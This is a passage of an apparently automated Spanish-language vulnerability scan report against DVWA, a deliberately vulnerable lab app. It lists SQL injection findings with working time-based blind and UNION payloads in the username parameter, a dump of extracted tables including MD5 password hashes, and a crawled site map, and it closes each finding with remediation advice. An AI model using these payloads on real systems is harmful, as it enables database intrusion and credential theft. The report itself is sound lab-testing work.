- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>

---
### SQL Injection (MySQL >= 5.0.12 AND time-based blind (query SLEEP))
- **Severidad:** High (High)
- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
- **Método:** N/A
- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `time-based blind`: `username=SCVZ' AND (SELECT 2192 FROM (SELECT(!SLEEP(5)))vEqw)-- xAer&password=Fqvd&Login=Login`
- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>

---
### SQL Injection (MySQL UNION query (NULL) - 8 columns)
- **Severidad:** High (High)
- **URL:** `http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP`
- **Método:** N/A
- **Descripción:** Inyección en parámetro `username` mediante un payload tipo `UNION query`: `username=SCVZ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171767071,0x475943447a716d6a6d634758484857584c6364507548546b464d5948476e65496a684d637447484d,0x7171767671),NULL,NULL#&password=Fqvd&Login=Login`
- **Solución:** <p>Use parameterized queries (prepared statements) instead of string concatenation for SQL queries. Use stored procedures. Apply least privilege to the database account.</p>

---

### Tablas Extraídas de la Base de Datos

#### Base de Datos: `dvwa`
**Tabla:** `guestbook`
| comment_id | name | comment |
| --- | --- | --- |
| 1 | test | This is a test comment. |


**Tabla:** `users`
| user_id | user | avatar | password | last_name | first_name | last_login | failed_login |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | admin | /hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 | admin | admin | 2026-08-05 19:50:13 | 0 |
| 2 | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown | Gordon | 2026-08-05 19:50:13 | 0 |
| 3 | 1337 | /hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b | Me | Hack | 2026-08-05 19:50:13 | 0 |
| 4 | pablo | /hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso | Pablo | 2026-08-05 19:50:13 | 0 |
| 5 | smithy | /hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith | Bob | 2026-08-05 19:50:13 | 0 |



---

## Mapa del Sitio (Spider)
<details><summary>Ver lista completa de URLs descubiertas</summary>

<ul>
<li><code>http://dvwa/favicon.ico</code></li>
<li><code>http://dvwa/dvwa/js/add_event_listeners.js</code></li>
<li><code>http://dvwa/dvwa/images/spanner.png</code></li>
<li><code>http://dvwa/instructions.php?doc=readme</code></li>
<li><code>http://dvwa/instructions.php?doc=PHPIDS-license</code></li>
<li><code>http://dvwa/instructions.php?doc=PDF</code></li>
<li><code>http://dvwa/instructions.php?doc=changelog</code></li>
<li><code>http://dvwa/dvwa/images/RandomStorm.png</code></li>
<li><code>http://dvwa/dvwa/images/logo.png</code></li>
<li><code>http://dvwa/docs/DVWA_v1.3.pdf</code></li>
<li><code>http://dvwa/instructions.php</code></li>
<li><code>http://dvwa/dvwa/js/dvwaPage.js</code></li>
<li><code>http://dvwa/login.php</code></li>
<li><code>http://dvwa/instructions.php?doc=copying</code></li>
<li><code>http://dvwa/dvwa/images/login_logo.png</code></li>
<li><code>http://dvwa</code></li>
<li><code>http://dvwa/about.php</code></li>
<li><code>http://dvwa/dvwa/css/main.css</code></li>
<li><code>http://dvwa/sitemap.xml</code></li>
<li><code>http://dvwa/</code></li>
<li><code>http://dvwa/dvwa/css/login.css</code></li>
<li><code>http://dvwa/robots.txt</code></li>
<li><code>http://dvwa/setup.php</code></li>
<li><code>http://dvwa/var/www/html/config/config.inc.php</code></li>
</ul>
</details>